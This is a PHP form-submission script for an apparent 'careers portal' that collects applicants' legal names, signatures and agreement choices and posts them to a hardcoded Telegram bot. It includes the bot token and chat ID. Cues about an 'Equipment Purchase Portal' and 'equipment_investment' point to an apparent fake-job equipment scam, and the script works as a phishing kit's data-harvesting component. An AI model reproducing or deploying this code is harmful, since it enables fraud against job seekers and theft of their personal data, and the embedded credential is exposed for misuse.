<?php
// submit-commitment.php
//require_once __DIR__ . '/config/database.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    $user_id = $_SESSION['user_id'];
    
    // Multiple Telegram Bots Configuration
    $telegramBots = [
        [
            'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', // Bot 1 token
            'chat_id' => '1325797388' // Bot 1 chat ID
        ],
        // Add more bots here if needed
    ];

    // Collect form data
    $legal_name = htmlspecialchars($_POST['legal_name']);
    $digital_signature = htmlspecialchars($_POST['digital_signature']);

    $agreements = [];
    for ($i = 1; $i <= 8; $i++) {
        $key = "agreement_$i";
        $agreements[$key] = isset($_POST[$key]) ? '✅ Agreed' : '❌ Not Agreed';
    }

    // Create message
    $message = "🤝 NEW PROGRAM COMMITMENT AGREEMENT 🤝\n\n";
    $message .= "👤 Applicant Info\n";
    $message .= "📛 Legal Name: $legal_name\n";
    $message .= "📝 Signature: $digital_signature\n\n";
    $message .= "✅ Agreement Terms\n";
    foreach ($agreements as $i => $status) {
        $num = str_replace("agreement_", "", $i);
        $message .= "$num. $status\n";
    }
    $message .= "\n⏰ Submitted on: " . date('Y-m-d H:i:s');
    $message .= "\n🚀 Next Step: Equipment Purchase Portal";

    // Send to all configured Telegram bots
    foreach ($telegramBots as $bot) {
        if (!empty($bot['token']) && !empty($bot['chat_id'])) {
            $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message
            ];
            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                    'ignore_errors' => true
                ],
            ];
            @file_get_contents($url, false, stream_context_create($options));
        }
    }

    // ✅ UPDATE DATABASE - Mark commitment step as completed
    // try {
    //     $database = new Database();
    //     $db = $database->getConnection();
        
    //     $update_query = "UPDATE users SET commitment_completed = 1, commitment_completed_at = NOW() WHERE id = :user_id";
    //     $update_stmt = $db->prepare($update_query);
    //     $update_stmt->bindParam(':user_id', $user_id);
    //     $update_stmt->execute();
    // } catch (Exception $e) {
    //     // Log error but don't break the flow
    //     error_log("Database update failed: " . $e->getMessage());
    // }

    // Store in session and redirect
    $_SESSION['commitment_data'] = $_POST;

    if (isset($_SESSION['financial_data']['equipment_investment']) &&
        $_SESSION['financial_data']['equipment_investment'] === 'yes') {
        header("Location: https://careers-portal.42web.io/thankyou.php?status=processing");
    } else {
        header("Location: https://careers-portal.42web.io/thankyou.php?status=processing");
    }
    exit;
} else {
    header('Location: https://careers-portal.42web.io/program-commitment.php');
    exit();
}
?>